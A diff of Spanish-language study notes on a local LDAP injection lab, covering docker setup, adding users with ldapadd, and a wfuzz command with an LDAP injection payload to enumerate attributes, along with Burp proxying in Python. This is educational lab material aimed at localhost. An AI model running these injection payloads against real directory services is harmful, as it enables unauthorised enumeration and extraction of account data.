@@ -22,9 +22,9 @@ ADD ./src/public /var/www/html/
 ```
 - Comandos a ejecutar luego de clonarnos el proyecto:
 ```bash
-docker run -p 389:389 --name openldap-container --detach osixia/openldap:1.2.2
+docker run -p 389:389 --name openldap-container --detach osixia/openldap:1.5.0
 docker build -t ldap-client-container .
-docker run --link openldap-container -p 8888:80 ldap-client-container
+docker run -dit --link openldap-container -p 8888:80 ldap-client-container
 ```
 - Podemos acceder a la web desde `localhost:8888`
 
@@ -51,4 +51,24 @@ ldapsearch -x -H ldap://localhost -b dc=example,dc=org -D "cn=admin,dc=example,d
 - Podemos interceptar la peticion con Burpsuite y cambiar el payload, ir descubriendo letra por letra, etc.
 
 ## Creamos mas usuarios
-- Dentro del servidor
+- Creamos una plantilla para un nuevo usuario
+![[Pasted image 20260403100247.png]]
+ - Donde dice Billy lo cambiariamos a nuestro usuario
+- Para agregar el usuario existe otra utilidad `ldapadd` para ello.
+```
+ldapadd -x -H "ldap://localhost" -D "cn=admin,dc=example,dc=org" -w admin -f newUser.ldif
+```
+- Lo importante es `-f` para agregar el archivo que queremos
+
+### Descubrimiento de atributos
+- Podemos con [[wfuzz]] buscar atributos
+```
+wfuzz -c --hh=439 -w /usr/share/secLists/Fuzzing/LDAP-openldap-attributes.txt -d "user_id=admin)(FUZZ=*))%00" http://localhost:8888
+```
+
+## Interceptar burpsuite con python
+```
+burp = {'http': 'http://127.0.0.1:8080'}
+
+requests.get(url, headers=headers, data=data, proxies=burp)
+```
